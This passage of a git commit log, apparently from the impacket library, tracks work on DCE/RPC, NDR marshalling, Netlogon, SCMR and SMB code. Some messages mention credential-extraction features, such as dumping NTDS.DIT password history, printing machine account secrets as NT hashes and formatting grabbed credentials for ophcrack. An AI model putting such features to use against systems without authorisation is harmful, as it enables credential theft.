Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 3 22:34:03 2013 +0000

    Endpoint mapper implementation for the new dcerpc v5

commit 7ce09112b76a4a4de3844fe6073bc118b39bc4fe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 3 22:29:46 2013 +0000

    More errors that can be triggered inside the rpc runtime

commit d6706d9fb0a5509fe29e3fa3f00adb8763eaeb5a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 3 22:29:04 2013 +0000

    UUID is MSRPC_UUID_SCMR

commit e01dcf408fbbc58f954a92ca61874b4dfbcce955
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Dec 3 15:24:09 2013 +0000

    ErrorCode is not always the return code status.. so, we're just grabbing the last 4 bytes of the answer

commit 9656bed16d40134a01e4dc82f03072bcccf41b43
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 2 23:18:43 2013 +0000

    1) Fixing calculation of array items when packing (len(itemn.getDataReferent(''))
    2) Setting up default alignment to 4 (let's see if it works... testcases good so far)

commit 17c57ff592d57f1c94ec9e3aa8da539e1a89a97c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 2 21:04:19 2013 +0000

    More padding issues solved (hopefuly) inside arrays encoding/decoding

commit 92978fceb2e05b939e52f216a7b1bc6f28cc2e4b
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 2 00:33:16 2013 +0000

    Cosmetic changes

commit bc0359470bcda6f94415e4a870e1da2c63985b89
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Dec 2 00:02:12 2013 +0000

    SCMR errors taken out.. now they are grabbing everything from impacket.system_errors.py

commit 796e6525779cd0f2e8e4770f8be6bdbf577b654f
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 1 23:44:48 2013 +0000

    SYSTEM Errors from [MS-ERREF].

commit 3159f7bcb115b595709e0588cfbdea7cb69d673b
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 1 22:58:16 2013 +0000

    propset ID

commit fc71e1f88f831668d5eb6e02ada3f75911dd8289
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 1 22:54:44 2013 +0000

    1)Better default parameters for the SCMR helpers
    2)Changed Exception name to DCERPCSessionError

commit de5d1fcdaa392f6820cca5e6c7a6dd281426f59f
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Dec 1 21:01:00 2013 +0000

    Fixed NDRArray.dump() for fields that are not a list

commit 3b4370546261441707080bd6daeac403580bb698
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 29 23:00:19 2013 +0000

    1) All helper methods start with h<method>
    2) No more need of a SCMRDceRpc class
    3) Requests are handled by rpcrt.request()
    4) SessionError exception returns the packet for further inspection

commit 2069e1a07cb5367c0e4334a26fd2c9116399f38a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 29 22:58:40 2013 +0000

    1) Added request() method
    2) Transfer syntax is now stored for later use

commit 07e4c0368c271a474a46f7de646e5b436b3c42e4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 28 17:11:24 2013 +0000

    Based on https://code.google.com/p/impacket/issues/detail?id=34, added password history dump (for NTDS.DIT) based on lanjelot's patch. Thanks mate!

commit d08c9c6a13a95858cd3a2ca3ac09bb0d588ac617
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 21:27:08 2013 +0000

    Changing SVCCTLSessionError for SCMRSessionError

commit cefac1e8f3e766bc86013924293c72a577ca58b0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 20:56:53 2013 +0000

    Changing NDRPointerNULL() for NULL, easier to read

commit ec4bbb24630df2833ee398d3e0b86fca3e48446f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 20:53:36 2013 +0000

    NULL = NDRPointerNULL()

commit 4d0a3b24efabcfa5f892deb56d7de58d7cc1993e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 19:26:14 2013 +0000

    Getting rid of isNDRCall, and adding topLevel parameter just for NDRPointers

commit 4e74593cae241194e254aa5e878a6bca4a6a3a23
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 05:11:23 2013 +0000

    Importing from v5

commit b4e05b5ad1d8f665d54b9a3a833bff498c10c3fd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 05:08:15 2013 +0000

    Importing from rcprt.py

commit a5b54adba5502f2adf87c931dde40c17a1d1e1aa
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 05:03:36 2013 +0000

    Adding rpcrt.py (old dcerpc.py) + transport.py.
    
    Modifying the rest of the sources

commit 674d74852eb15c6e61b1ef95ea1b7aca685ee43e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:43:39 2013 +0000

    Adding headers

commit 964982e3f8b599780c13ee2c5ef594485fe63318
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:41:57 2013 +0000

    dcerpc.v5.scmr test cases

commit 44a2edea5da666c641effda4db97320a3548e45f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:38:38 2013 +0000

    Changing imports to point to dcerpc.v5

commit 441edf6d6542944ba2431f63befca363bf69ab3c
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:34:06 2013 +0000

    This is the right name for [MS-SCMR]

commit 00513e1732e77ce224126c2e8815d7e32e2eb8bc
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:32:59 2013 +0000

    Bye Bye

commit 73dddeb365ca59fed31e9f1fddab695561b16586
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:28:36 2013 +0000

    Adding the files i'm playing with here. Again, no more development in impacket/dcerpc

commit d57847b4f75a8ad0818190a141e7afc0784bcd6e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 27 04:26:09 2013 +0000

    Moving experimental to dcerpc.v5
    
    I'll be working here from now on.. Not touching impacket/dcerpc anymore.
    
    Too many changes going on!

commit 7a03cfa6ec6d67cd98fc53b4f681af9e035abfd7
Author: aurelianocalvo <aurelianocalvo@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 26 17:50:36 2013 +0000

    Changed the appearance of self.child().__str__() to str(self.child()) in order to show child packets that did not implement __str__

commit 60a757e29e5046ed22bdbbfa2bc301154d0deb6a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 22 21:58:48 2013 +0000

    Changed the Pointers stuff based on previous commit on ndr.
    
    Plus, for svcctl added:
    1) RQueryServiceLockStatusW
    2) RStartServiceW

commit ffdc8e1f5d1f36aa8f5e9324d2249b609d443c1f
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 22 21:57:47 2013 +0000

    Chaging the NDRPointer referent name to 'Pointer', trying to make it easier for coders to understand dereferencing.. we'll see.

commit 82a9940a50cb4353ecc49673814af87a97a7a714
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 22 21:31:45 2013 +0000

    Fixed padding for Arrays

commit 876ec9c525a9cf5a3ca82a98d19a0efa90bb268b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 22 02:39:24 2013 +0000

    Fixed ChangeServiceConfigW()

commit 02108d261c7c1cd2bd52665074509ce10a02f9cd
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 22 01:01:10 2013 +0000

    These are interfaces i'm playing with the new ndr engine so I don't mess up the current ones. This directory will be removed once they are ready.

commit eaceacad99382ea14f88bf0ed89a36f4349a3407
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 21 22:17:36 2013 +0000

    1) RPC_UNICODE_STRING now accepts regular strings, and takes care of encoding/decoding them
    2) More NDRPointer optimization to make it work when receiving/sending NULL pointers
    3) Fixed wrong UNICODE_STRING() base class (it should be NDR, not NDRPointer)

commit ea7137d818bcd55d420b43912c9c68616cb1eb78
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 21 14:06:59 2013 +0000

    Removed debug message

commit f5c860da186aca978ad3cc5e2c07d95966fdf52a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 21 13:40:42 2013 +0000

    Adjusting NDRPointer, when it's null, depending on whether we're under NDR64 or not

commit 8364edb2529e4430e42b083c7bcf83c4683dc9c0
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 21 00:13:14 2013 +0000

    edefined UNIQUE_RPC_UNICODE_STRING for consistency.. Yes.. we will need to do a ['Data']['Data'] to assign a value, but it actually makes sense.
    Added check inside NDRPointer if we receive a NULL Pointer, so we don't keep unpacking the rest.
    Added consistency check, which bassically does, for every struct unpacked, checks if the packing matches the original data. Just for debugging purposes (turned on now).
    netlogon changes based on ndr.py changes.
    
    Don't use netlogon.. I'm using it to test ndr.py

commit 9f69c9927716b8a0c7f09df97437c5e1768567c2
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 20 02:12:42 2013 +0000

    Okey.. We're getting closer.. although this might not work.
    I'm taking out the embeeded pointers and top level pointers. According to [C-706], top level pointers are the ones that are in a DCE Call (and their referents are NOT represented later), whereas the other pointers are embedded pointers (with deffer the representation).
    
    So.. in order to make it easy to define NDR types, i'm creating a single class NDRPointer, which will act different when it is part of a DCE Call or it's inside a structure/array/etc.
    
    We'll see.. wort case, we come back to the previous revision

commit 72bcfb39195501a50b0ccac56256618aee77b829
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 19 21:40:52 2013 +0000

    getDataReferent must return the actual data even if there's nothing to process
    added PNDRUniConformantVaryingArray()

commit fe655e46f81416a0a35bc898a2befc83bab30a1e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 19 14:48:45 2013 +0000

    Based on feedback from Renaud Dubourguais we're changing some behaviour when retrieving/storing files, allowing to set th
    e share access mode, aiming at making this change dialect independent. This involves:
    
    1) smbconnection: changed getFile() and putFile(), adding a shareAccessMode parameter
    2) smb3.py: changed retrieveFile(), storeFile(), adding a shareAccessMode parameter
    3) smb.py: changed nt_create_andx(), retr_file(), stor_file(), stor_file_nonraw() adding a shareAccesMode, and using nt_create_andx as the way to open the files, so we keep the same shareAccesMode flags across the different dialects.
    
    Functionality shouldn't change if no shareAccessMode flags are specified

commit 4082fd1d312ccff27207ef6dd7ee2193c094d724
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Nov 18 16:12:05 2013 +0000

    Fixed arrays marshaling/unmarshaling where the referent data was not processed

commit b8be1d76ea90e9b191a11d52e0e5112aa2289b70
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 18:52:42 2013 +0000

    PNL_SITE_NAME_ARRAY is a toplevelpointer

commit 9576e329b05e454223127aef201967bf5dceb6d3
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 18:52:14 2013 +0000

    Still have to solve the situation of nested arrays with referent data. Leaving it commented for now

commit 76cef7696e8ff4e455c697a8b5cecd4b12cfb571
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 18:24:59 2013 +0000

    Removed debug msg

commit 6cfdb9f99fd8429bfde18a25d76b206216f5c7e5
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 17:56:55 2013 +0000

    LPWSTR2 is actually a PRPC_UNICODE_STRING. Still, [MS-DTYP] contradicts other documents describing such structures. Hence, there might be changes in the future until I figure out of things actually are :s

commit b091961a9e78278d688dbb2cb93c6ae92232aff9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 17:45:31 2013 +0000

    Redefinition of RPC_UNICODE_STRING, UNIQUE_RPC_UNICODE_STRING

commit e383907b462c1bb2e3a6fc1ba56786fe8705f159
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 16:39:00 2013 +0000

    Fixed bad definition of NDRPointerNULL

commit 8040cb5997f82b4ff8ce145bc8fec9f09223173e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 15:55:38 2013 +0000

    Added NDRCall(). This should be the base class for every DCERPC structure call. Still testing

commit cb1095ac0c0e76921ecdc8270f4c9ebf3c183c62
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 15:11:42 2013 +0000

    Minimal changes.. still pending managing the representation of referents correctly, according to [C706], 14.3.12.3 Algorithm for Deferral of Referents

commit a44f796a67d8fd5566b1ea858a222b32387a4046
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 16 01:27:52 2013 +0000

    Better handling of arrays and referent's data

commit 3b4b460ec1a509010d163b67922770c18f8afd9d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 15 21:13:07 2013 +0000

    Continuing with r992, testing the new NDR lib. Still lots to do

commit 1c4689255c92242c77f5730313c6b939b4003a35
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 14 21:45:52 2013 +0000

    Since I added this a few days ago, I'm experimenting with NDR inside this interface. Marshalling gets much simpler.

commit ec52aa727309b57648097749658d0c795c199d62
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 14 21:45:00 2013 +0000

    [C706] Transfer NDR Syntax initial implementation.
    Needed for so long. The objective is these classes to be the foundation for all NDR encodings. ndrutils will be gone eventually. Testing needed

commit b7964844564f51f2aceb5903e08cff7546110f8e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 12 16:26:58 2013 +0000

    Don't stop at the first share w/o write permissions. keep trying

commit 02120781d31f8305da8178d4907308040a4d4880
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Nov 10 23:01:51 2013 +0000

    Updated test cases.. dummy passwords for my lab

commit 9c235ca5360212ed9438ff8a3094caad5a33694b
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Nov 10 22:38:49 2013 +0000

    Added NetrLogonGetCapabilities(), NetrLogonGetDomainInfo() (not finished yet)

commit 1e416549b281072ba332a2485be0aa6685742560
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Nov 10 20:47:57 2013 +0000

    More changes here. I'm adapting the code so another SSP (netlogon) is supported by the dcerpc runtime. Still work to be done (not working at the moment), but shouldn't interfere with WINNT SSP at all (crossing fingers)

commit 092d41aa15c26745bf4790df231f03c8012968cf
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sun Nov 10 20:46:19 2013 +0000

    Added ComputeNetlogonCredentialAES(), ComputeSessionKeyAES(), ComputeNetlogonSignatureAES(), encryptSequenceNumberAES(), decryptSequenceNumberAES(), SIGN(), SEAL(), UNSEAL().
    
    In short, all the cryptographic operations for netlogon SSP should be there. Now we gotta test them more

commit b9ada53288be978faeda630d4fbd6c6ef0f49f9c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 9 22:47:13 2013 +0000

    Moving some crypto stuff into netlogon. They shouldn't be used by anyone else, so it makes sense to be just inside netlogon

commit 5e7d57d87410efe2134d665406dc8131a93a8b36
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 9 21:24:21 2013 +0000

    Only the first 8 bytes are the ones that matter

commit 79793bf9156feb01090cb34636e4a29b01565fdf
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 9 21:18:52 2013 +0000

    Added getSSPType1(), SIGN() and deriveSequenceNumber(). I'm not sure this will be here in the future since this is the netlogon SSP

commit fa985fffcce27a7891385b9812ea155928e27881
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 9 21:17:30 2013 +0000

    Added encryptSequenceNumberRC4() decryptSequenceNumberRC4()

commit ec14f20550f688d922d3f6739c155a36ee9d758d
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 8 19:16:04 2013 +0000

    Adding some structures and functions for the NETLOGON security provider. Still not used

commit 50e5f50df0fe7471ed01a7d49c7215fff1ed58ef
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 8 19:13:10 2013 +0000

    Big changes on DCERPC Runtime, aiming at making it more flexible for future stuff to be added.
    
    dcerpc.py:
    1) Security Provides and Auth Levels added
    2) Changed most of the structures in such a way that they work not only for creating packets, but for parsing packets (before it was just one way).
    3) MSRPCArray() and MSRPCNamedArray() moved to samr
    4) SEC_TRAILER() structure added, following the recommendations of [MS-RPCE]
    5) Calling to SEAL/SIGN changed, isDCE not available anymore
    
    ntlm.py:
    1) DCERPC_NTLM* structures are gone. Didn't make any sense in the context of ntlm.py. Now ntlm.py crafts the same structures
    regardless of who's calling them (smb or dcerpc), and it's up to the caller to treat them in their language. This is aimed at making ntlm.py as general as possible as a security provider
    2) the isDCE argument for various functions is removed. Not needed anymore, based on 1). Special attention should be kept for thos using getNTLMSSPType1(),getNTLMSSPType3(),MAC(),SEAL() and SIGN() in their implementations since the amount of parameters changed
    
    srvsvcserver.py:
    1) ntlm.DCERPC_NTLMAuthHeader not available anymore, replaced by SEC_TRAILER()
    
    test_ntlm.py:
    1) Changed SEAL() call since isDCE is not there anymore

commit cacffb703830b9f1f5cacf9d0596fed64aa9b356
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 8 18:57:30 2013 +0000

    Test cases for the DCERPC runtime.

commit adba0fb24ffc5a0967f603ec461d34169f4ca11c
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 8 18:55:58 2013 +0000

    We don't need this anymore

commit e3859e47443be9d41213d94c1cbd91ef4bc2c298
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 8 17:42:11 2013 +0000

    More test cases added. Except for the named pipes methods exposed by smbConnection, we're testing the rest of the methods, for each dialect we support

commit 1141246543e176de67413c53ee0a61d08ce4c782
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 7 22:20:26 2013 +0000

    MSRPCNameArray() and MSRPCArray() are only used here. Soon to be erased from dcerpc.py

commit 989f6b17f550b0404e9005c4b2b531a45a4174bb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 7 21:45:38 2013 +0000

    Added ::: at the end of the credentials grabbed so it's compatible with ophcrack

commit 44ec59cc26aec6d4b4bd5e53efdb667dd5f24bfb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 7 21:21:13 2013 +0000

    No need to send isDCE parameter. It will be deprecated soon

commit 25c451cd577bcd1f8f607600e2a3d0baf51c5acb
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 7 21:10:06 2013 +0000

    Don't fail if we don't have a smb.log

commit ff1bfc86fcb3a686d63ff5bd724b3d705af43189
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Nov 7 20:46:16 2013 +0000

    Removed raise when an exception is triggered

commit 147791a176454e280efdd0d816e701e80c6d72ed
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 6 16:40:15 2013 +0000

    Auth levels should actually be here, not inside ntlm.py

commit e79fafc5af03f4bf90134804879ad47927fcda53
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Wed Nov 6 00:37:41 2013 +0000

    Adding set_auth_type() for future use

commit e36492a489756bf1a84981b5b463924e4d581d19
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 23:47:41 2013 +0000

    Changed NETLOGONServerGetTrustInfoResponse(), in particular PNL_GENERIC_RPC_DATA. I'm still not sure it's right since I can't get enough tests yet.

commit 5c2bf2b500495e0a1d6e26c4189bb40b9f10be7a
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 23:38:21 2013 +0000

    using commonHdr instead of structure, easier to include in other structures

commit e4772b97bd07e2d37830073a2c31cb3c6459f9e1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 23:32:12 2013 +0000

    MACHINE.ACC secrets printed out much better.. including the machine name and domain whenever it's possible

commit d14765341a7edfaeeee3b0bd99af94b6c81fd633
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 21:49:35 2013 +0000

    Added NetrServerPasswordGet()

commit 78b1b7cc0cb54bf4b536c1be875c7df3dfabd63b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 21:03:34 2013 +0000

    Added NetrServerGetTrustInfo()

commit c1b4688f02368d9e22d9090687a086b1e6a3e7a8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Nov 5 20:54:58 2013 +0000

    Added [MS-SAMR] Section 2.2.11.1.1

commit cd3b3db7679700e3e2999d45dd3504ac3f0eea77
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Mon Nov 4 21:00:50 2013 +0000

    updated KNOWN_PROTOCOLS

commit f25c099fae201e78f876fa068d4b713192c1f4fa
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 2 20:59:37 2013 +0000

    Added NetrShareGetInfo().
    Removed unnecessary structures.. moved soon to be removed functions to the end of the file

commit 7ea54718cd2165b8431a0d4f769dcb01835fedff
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 2 19:55:57 2013 +0000

    All structs from srvsvc.py that were removed copied here. They are still being used. I'll port this whole file later

commit 7b6a63f81cd8bc7c500b940a72b3bcda64d6f597
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 2 19:20:02 2013 +0000

    get_share_enum_1() stuff removed. Just left it calling NetrShareEnum for compatibility reasons. Might be out soon. Use NetrShareEnum() instead.

commit df5b504beadc5d9f957eb9e27108f4552b66bebd
Author: bethus <bethus@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Sat Nov 2 19:04:20 2013 +0000

    Changed my mind.. strings returned are UNICODE (NULL terminated). It's up for the client to decode them. Mainly to maintain same behaviour of other functions

commit d44e3e0b6f371af5ea4db3af42ef1caaac4ee1e1
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 23:23:22 2013 +0000

    smbconnection.listShared() now uses NetrEnumShares(). Changed smbclient.py to reflect that change (difference is unicode decode is not needed)

commit 4eed74ea83cda3fc1a512005a1c4a20f025b7a6d
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 23:18:57 2013 +0000

    Added NetrShareEnum(). get_share_enum_1() going away soon. Don't use it anymore

commit d90de89bd072975cfe93a9b7fb2052285db8f5a8
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 21:29:19 2013 +0000

    Added who commands, which calls NetrSessionEnum()

commit b8deea30fb4d783d2c2834e663e7a852d980b9d9
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 21:25:17 2013 +0000

    Added:
    1) SRVSVCSessionError()
    2) NetrSessionEnum()
    plus minor cosmetic things

commit 73ad64af2fee827d268c94ac97d0c0d858afec6b
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 21:08:43 2013 +0000

    Forgot to increment self['Data'] for deferred fields

commit 45c53c718ff3f035f361a5d905152f6609615877
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 20:43:05 2013 +0000

    First try for a generic NDRArray.. I'm sure it'll change in the future

commit a52b612c65af81d8641a049bf701e17ec0513fbe
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 20:27:45 2013 +0000

    Opps.. forgot the enclosing bracket :-o

commit 62ba258015d265b394e8b4847a231c1d2f168d4e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 20:27:01 2013 +0000

    Fixed indentation bug for extra items created on the fly

commit 1976d4eda35d23167c5c1fe8d3f486009d72d380
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Fri Nov 1 15:38:33 2013 +0000

    MACHINE.ACC converted to nthash :)

commit 1936ea0e495e59ee14c00a82528fe7038bbaf73e
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 31 21:37:41 2013 +0000

    Added:
    1) DsrGetDcSiteCoverageW
    2) DsrGetSiteName
    3) DsrNetrGetAnyDCName
    4) NetrGetDCName

commit c6e47f4573e2dfb9a11cefac89fdd276396f5707
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 31 20:11:36 2013 +0000

    [MS-NRPC] Netlogon interface implementation. Just starting...

commit 437935cf9a3a59a333c9344b3294bbbaeb246fe4
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Thu Oct 31 20:09:40 2013 +0000

    [MS-NRPC] Section 3.1.4.3.2, which adds:
    1) ComputeNetlogonCredential()
    2) ComputeSessionKeyStrongKey()

commit 51208f4ed3b6927c34d40ed76823877e0d2a51d7
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 29 16:04:19 2013 +0000

    Added get_dce_rpc() method to the DCERPCTransport. Now clients don't need to cast a transport to a DCERPC_v5 or V4. That is handled by this method.
    I'm changing the examples to reflect this move.

commit 080a149e3f9c4b24401eda27a3c7e58888c26048
Author: bethus@gmail.com <bethus@gmail.com@ad9a8d78-5211-11de-8950-a5d9c972bc64>
Date:   Tue Oct 29 14:33:35 2013 +0000

